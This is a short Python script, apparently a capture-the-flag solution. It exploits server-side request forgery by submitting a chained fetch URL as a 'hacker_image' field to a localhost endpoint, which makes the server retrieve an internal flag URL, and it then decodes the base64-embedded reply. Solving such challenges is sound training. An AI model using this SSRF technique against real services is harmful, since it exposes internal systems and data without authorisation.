import re
import requests
import base64

_PATTERN=r"<img src=\"data:image/png;base64,(.*)\" alt=\"Hacker Image\">"
_ENDPOINT="http://localhost/check"


def main():
    payload = {
        "hacker_name": "adamd",
        "hacker_image": "http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag",
    }

    response = requests.post(_ENDPOINT, data=payload)
    assert response.status_code == 200
    match = re.search(_PATTERN, response.text)
    assert match is not None
    response = match.groups(1)[0]
    response = base64.b64decode(response)
    print(response.decode())


if __name__ == "__main__":
    main()
